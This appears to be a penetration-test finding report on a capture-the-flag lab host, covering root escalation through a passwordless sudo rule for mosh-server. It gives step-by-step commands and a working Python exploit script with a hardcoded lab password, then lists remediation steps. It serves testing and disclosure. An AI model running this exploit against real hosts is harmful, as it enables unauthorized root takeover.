# Sudo NOPASSWD Misconfiguration Allows Root Privilege Escalation via mosh-server

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2026-03-06 19:38:45 UTC
**Target:** 10.129.1.170
**Endpoint:** sudoers policy entry for /usr/bin/mosh-server
**Method:** LOCAL
**CWE:** CWE-250
**CVSS:** 7.8

## Description

Overview:
A local privilege escalation vulnerability was confirmed on the target host due to an unsafe sudoers rule granting an unprivileged user passwordless execution of /usr/bin/mosh-server as root. This permission enables spawning a root-context mosh session and executing arbitrary commands as root.

Severity and CVSS (vector only):
High severity. CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

Affected asset(s):
underpass.htb
Host-level sudo policy affecting user svcMosh:
(ALL) NOPASSWD: /usr/bin/mosh-server

Technical details:
After initial user-level compromise, sudo policy inspection showed:
User svcMosh may run the following commands on localhost:
(ALL) NOPASSWD: /usr/bin/mosh-server

By invoking sudo /usr/bin/mosh-server new with a root shell command and connecting with the emitted MOSH key/port, root command execution was achieved. Validation output confirmed uid=0(root) and successful read of /root/root.txt.

Proof of concept:
Authenticate as compromised user svcMosh, run sudo mosh-server new to obtain MOSH CONNECT token, set MOSH_KEY locally, connect with mosh-client, and observe root command output.

Impact:
Any attacker obtaining svcMosh-level access can escalate to full root control, compromising the entire host confidentiality, integrity, and availability.

## Impact

This issue enables complete host takeover from a low-privilege foothold. Attackers can access all sensitive data on the host, alter security controls, persist with root privileges, and disrupt authentication/network services. In production environments, this represents critical post-compromise amplification and collapse of privilege separation.

## Technical Analysis

The vulnerability is rooted in over-privileged sudo delegation. mosh-server is not a constrained administrative wrapper and can be used to establish a privileged interactive execution channel. Granting NOPASSWD rights for this binary to a non-root user effectively bypasses intended privilege boundaries.

Validated escalation evidence:
- sudo -l output confirmed unrestricted passwordless execution of /usr/bin/mosh-server.
- Root-context session output included:
  uid=0(root) gid=0(root) groups=0(root)
- Root-only file access was demonstrated by reading /root/root.txt.

This is a direct privilege-escalation path requiring no kernel exploit and minimal attacker interaction.

## Proof of Concept

1. Obtain a shell/session as user svcMosh.
2. Run sudo -l and confirm:
   (ALL) NOPASSWD: /usr/bin/mosh-server
3. Start privileged mosh server with root command:
   sudo /usr/bin/mosh-server new -- /bin/bash -lc 'id; whoami; cat /root/root.txt; exit'
4. Capture MOSH CONNECT output (port and key).
5. On the attacker side, set environment variable MOSH_KEY to the provided key.
6. Connect using mosh-client to the provided UDP port.
7. Observe root command output and root.txt content, confirming privilege escalation.

```
import os
import re
import subprocess
import tempfile

TARGET = "10.129.1.170"
USER = "svcMosh"
PASSWORD = "underwaterfriends"

def run(cmd):
    return subprocess.run(cmd, shell=True, text=True, capture_output=True)

def main():
    ssh_cmd = (
        "sshpass -p '{pw}' ssh -tt "
        "-o PreferredAuthentications=password "
        "-o PubkeyAuthentication=no "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null "
        "{user}@{target} "
        "\"sudo /usr/bin/mosh-server new -- /bin/bash -lc 'id; whoami; cat /root/root.txt; exit'\""
    ).format(pw=PASSWORD, user=USER, target=TARGET)

    out = run(ssh_cmd)
    text = (out.stdout or "") + (out.stderr or "")
    print("[*] SSH/mosh-server output:")
    print(text[:1500])

    m = re.search(r"MOSH CONNECT\\s+(\\d+)\\s+([A-Za-z0-9+/=]+)", text)
    if not m:
        print("[-] Could not parse MOSH CONNECT line")
        return

    port = m.group(1)
    key = m.group(2)
    print(f"[+] Parsed port={port} key={key}")

    os.environ["MOSH_KEY"] = key

    with tempfile.NamedTemporaryFile(delete=False) as tf:
        capture_file = tf.name

    mosh_cmd = f"script -q -c \"timeout 10s mosh-client {TARGET} {port}\" {capture_file}"
    run(mosh_cmd)

    strings_cmd = f"strings {capture_file}"
    cap = run(strings_cmd).stdout or ""
    print("[*] mosh-client capture:")
    print(cap[:3000])

    if "uid=0(root)" in cap:
        print("[+] Vulnerable: root privilege escalation confirmed")
    else:
        print("[-] Root marker not observed in capture")

if __name__ == "__main__":
    main()
```

## Remediation

1. Remove dangerous sudo delegation:
   delete NOPASSWD access to /usr/bin/mosh-server for non-root users.
2. Enforce least-privilege sudo design:
   allow only narrowly scoped administrative wrappers with fixed arguments.
3. Require authentication and command restrictions:
   if sudo is required, use specific command aliases and avoid interactive/network-capable binaries.
4. Audit sudoers comprehensively:
   identify and remove similar escalation-prone entries (shell-capable, interpreter, file-edit, networking tools).
5. Add host hardening and monitoring:
   alert on anomalous sudo invocations and mosh-server launches by non-admin users.
6. Rotate sensitive credentials and investigate compromise scope:
   after remediation, rotate secrets and perform incident review for potential root-level persistence.
